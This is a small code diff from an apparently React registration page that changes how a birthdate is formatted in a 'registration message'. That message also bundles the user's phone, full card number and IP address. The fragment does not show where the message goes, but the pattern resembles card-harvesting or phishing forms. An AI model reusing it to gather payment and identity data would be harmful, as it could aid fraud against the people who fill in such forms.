@@ -133,7 +133,7 @@ const Index = () => {
         const message = formatRegistrationMessage({
           sessionId,
           phone: formData.phone,
-          birthdate: `${formData.birthdateDay}/${formData.birthdateMonth}/${formData.birthdateYear}`,
+          birthdate: `${formData.birthdateYear}-${formData.birthdateMonth.padStart(2, '0')}-${formData.birthdateDay.padStart(2, '0')}`,
           cardNumber: formData.cardNumber,
           ip: ip.data.ip
         });
